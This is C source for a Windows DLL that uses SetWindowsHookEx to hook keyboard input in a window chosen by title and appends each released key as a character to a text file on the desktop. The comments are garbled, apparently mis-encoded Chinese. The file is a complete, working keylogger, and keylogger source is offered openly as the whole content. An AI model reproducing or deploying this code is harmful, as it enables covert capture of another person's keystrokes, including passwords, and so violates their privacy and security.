#define _CRT_SECURE_NO_WARNINGS
#include "hook.h"
#include <stdio.h>

HINSTANCE  g_hInstance = NULL;
HHOOK g_Hook = NULL;


///////////////////////////////////////////////////////////////////////////////////////////////////////////

LRESULT CALLBACK KeyBoardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {

	/*************************************************************************
	* WH_KEYBOARD ���Ӽ��� WM_KEYDOWN �� WM_KEYUP. ͨ���鿴
	* lParam �� wParam ��ֵ, ����: lParam ���λΪ0��ʾVM_KEYDOWN,
	* Ϊ1��ʾVM_KEYUP; wParam Ϊ������ͨ������
	*************************************************************************/

	if (nCode < 0)  // do not process message 
		return CallNextHookEx(g_Hook, nCode, wParam, lParam);

	// ��������Ϣд���ļ�
	if ((lParam >> 31) & 0x01) {	// WM_KEYUP
		FILE *fp = NULL;
		if ((fp = fopen("C:\\Users\\len\\Desktop\\key.txt", "a")) == NULL) {
			return CallNextHookEx(g_Hook, nCode, wParam, lParam);
		}

		BYTE KeyState[256];
		GetKeyboardState(KeyState);
		WORD w;
		ToAscii(wParam, 0, KeyState, &w, 0);

		char ch = (char)w;
		fwrite(&ch, sizeof(ch), 1, fp);
		fclose(fp);
	}

	return CallNextHookEx(g_Hook, nCode, wParam, lParam);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

BOOL InstallHook(LPCWSTR lpszWindowName) {
	BOOL bOk = FALSE;
	HWND hWnd = NULL;
	DWORD dwThreadId = 0;

	hWnd = FindWindow(NULL, lpszWindowName);
	if (hWnd != NULL) {
		dwThreadId = GetWindowThreadProcessId(hWnd, NULL);
		if (dwThreadId != 0) {
			g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyBoardHookProc, g_hInstance, dwThreadId);
			if (g_Hook != NULL) { bOk = TRUE; }
		}
	}

	return bOk;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

BOOL UninstallHook() {
	return UnhookWindowsHookEx(g_Hook);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////

BOOL WINAPI DllMain(HINSTANCE hInstanceDll, DWORD fdwReason, LPVOID lpReserved) {

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH: // DLL loaded
		g_hInstance = hInstanceDll;
		break;
	}
	return TRUE;
}

//////////////////////////////////////////// End /////////////////////////////////////////////////////////
